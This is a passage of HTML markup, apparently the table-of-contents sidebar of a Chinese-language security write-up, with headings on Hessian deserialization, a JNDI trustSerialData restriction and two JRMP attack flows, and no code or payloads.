class="toc-link" href="#Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">Hessian反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JNDI-trustSerialData%E9%99%90%E5%88%B6"><span class="toc-text">JNDI trustSerialData限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F"><span class="toc-text">非预期</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8EJRMP%E7%9A%84%E4%B8%A4%E7%A7%8D%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B%E5%A6%82%E4%B8%8B"><span class="toc-text">关于JRMP的两种攻击流程如下</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="toc-text">第一种攻击方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="toc-text">第二种攻击方式</span></a></li></ol></li></ol> -->
         <div class="toc"></div>
       </div>
     </div>
